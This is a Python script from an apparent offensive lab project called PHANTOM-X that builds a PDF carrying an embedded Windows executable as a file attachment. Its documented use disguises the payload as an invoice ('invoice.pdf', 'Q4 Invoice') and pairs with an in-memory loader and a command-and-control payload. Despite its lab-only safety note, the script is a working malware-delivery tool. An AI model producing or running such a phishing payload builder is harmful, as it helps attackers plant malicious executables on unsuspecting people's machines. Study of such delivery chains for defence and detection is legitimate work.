#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM-X :: Phase 1 -- attack-chain PDF generator
================================================================================
make_attack_pdf.py -- Build a PDF that carries a Windows PE payload as an
embedded file attachment.

This closes the loop with px_loader.exe: the loader parses the PDF, finds the
embedded file, decodes it in memory, maps the PE and runs it. The payload
never touches the filesystem.

WHAT IT PRODUCES
    A structurally valid PDF containing:
      * a /Filespec naming the payload,
      * an /EmbeddedFile stream holding the PE bytes (FlateDecode),
      * a /Names /EmbeddedFiles name tree entry,
      * a FileAttachment annotation on the page so a reader will surface it
        to the user as an attachment.

SAFETY
    The payload is whatever file you point at. This script does not create
    or modify the payload; it only embeds it. The payload used by the
    PHANTOM-X lab (px_payload.exe) is a plain, unobfuscated lab instrument
    that connects to a lab C2 server on an isolated network.

USAGE
    python3 make_attack_pdf.py --payload ../phase3_fileless/loader/px_payload.exe \
                               --out ../phase1_pdf/samples/px_attack_chain.pdf

    python3 make_attack_pdf.py --payload payload.exe --out out.pdf \
                               --name invoice.pdf --attachment "Q4 Invoice"
"""

from __future__ import annotations

import argparse
import hashlib
import os
import sys
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from make_test_pdfs import PDFWriter, Name, Ref, ser  # noqa: E402


def build_attack_pdf(payload_path: str, filename: str, attachment_label: str,
                     subject: str) -> bytes:
    with open(payload_path, "rb") as fh:
        payload = fh.read()

    w = PDFWriter()

    ef_num = w.add_stream({
        "Type": Name("EmbeddedFile"),
        "Subtype": Name("application#2Fvnd.microsoft.portable-executable"),
        "Params": {"Size": len(payload)},
    }, payload)

    fs_num = w.add_dict({
        "Type": Name("Filespec"),
        "F": filename,
        "UF": filename,
        "EF": {"F": Ref(ef_num)},
        "Desc": attachment_label,
    })

    tree_num = w.add_dict({
        "Names": [filename, Ref(fs_num)],
    })

    text = (
        f"BT\n/F1 12 Tf\n72 720 Td\n({subject}) Tj\n"
        "0 -18 Td\n(Please review the attached document.) Tj\nET\n"
    ).encode("latin-1", "replace")

    font = w.add_dict({
        "Type": Name("Font"), "Subtype": Name("Type1"),
        "BaseFont": Name("Helvetica"), "Encoding": Name("WinAnsiEncoding"),
    })
    content = w.add_stream({}, text)
    pages = w.reserve()
    page = w.add_dict({
        "Type": Name("Page"),
        "Parent": Ref(pages),
        "MediaBox": [0, 0, 612, 792],
        "Resources": {"Font": {"F1": Ref(font)}},
        "Contents": Ref(content),
    })
    w.put(pages, ser({"Type": Name("Pages"), "Kids": [Ref(page)], "Count": 1}))

    annot = w.add_dict({
        "Type": Name("Annot"),
        "Subtype": Name("FileAttachment"),
        "Rect": [72, 480, 260, 520],
        "Contents": attachment_label,
        "FS": Ref(fs_num),
    })
    w.put(page, ser({
        "Type": Name("Page"), "Parent": Ref(pages),
        "MediaBox": [0, 0, 612, 792],
        "Resources": {"Font": {"F1": Ref(font)}},
        "Contents": Ref(content),
        "Annots": [Ref(annot)],
    }))

    cat = w.add_dict({
        "Type": Name("Catalog"), "Pages": Ref(pages),
        "Names": {"EmbeddedFiles": Ref(tree_num)},
    })
    info = w.add_dict({
        "Title": subject,
        "Producer": "PHANTOM-X make_attack_pdf.py",
        "Creator": "PHANTOM-X",
        "CreationDate": "D:20260101000000Z",
    })
    return w.build(cat, info)


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="Build a PDF carrying a Windows PE payload as an embedded "
                    "attachment.")
    ap.add_argument("--payload", required=True, help="PE file to embed")
    ap.add_argument("--out", required=True, help="output PDF path")
    ap.add_argument("--name", default=None,
                    help="filename shown to the user (default: payload basename)")
    ap.add_argument("--attachment", default="Attached document",
                    help="annotation description")
    ap.add_argument("--subject", default="Document for review",
                    help="visible document subject line")
    args = ap.parse_args(argv)

    payload = os.path.abspath(args.payload)
    if not os.path.isfile(payload):
        print(f"error: payload not found: {payload}", file=sys.stderr)
        return 2

    with open(payload, "rb") as fh:
        raw = fh.read()
    if raw[:2] != b"MZ":
        print("error: payload does not start with 'MZ' -- not a PE image",
              file=sys.stderr)
        return 2

    name = args.name or os.path.basename(payload)
    data = build_attack_pdf(payload, name, args.attachment, args.subject)

    os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
    with open(args.out, "wb") as fh:
        fh.write(data)

    print(f"[+] payload   : {payload}")
    print(f"[+]           {len(raw)} bytes  sha256={hashlib.sha256(raw).hexdigest()}")
    print(f"[+] output    : {os.path.abspath(args.out)}")
    print(f"[+]           {len(data)} bytes  sha256={hashlib.sha256(data).hexdigest()}")
    print(f"[+] attachment: {name}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
